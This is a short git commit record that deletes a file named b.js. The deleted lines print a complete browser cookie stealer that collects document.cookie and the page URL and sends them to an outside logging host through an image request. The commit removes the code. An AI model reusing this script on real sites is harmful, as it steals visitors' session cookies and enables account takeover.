b9351f3d5c565aa8d9b40f6f39b02e76e0c3f6b6
9os <druidboykoston@gmail.com>
2017-03-09 19:49:21 -0600

    Delete b.js

--- b.js
+++
@@ -1,8 +0,0 @@
-//Gen data
-cookie = "Cookies:"+document.cookie;
-url = "URL:"+document.location;
-
-$data = encodeURIComponent(cookie+url);
-
-var imageObject = new Image();
-imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
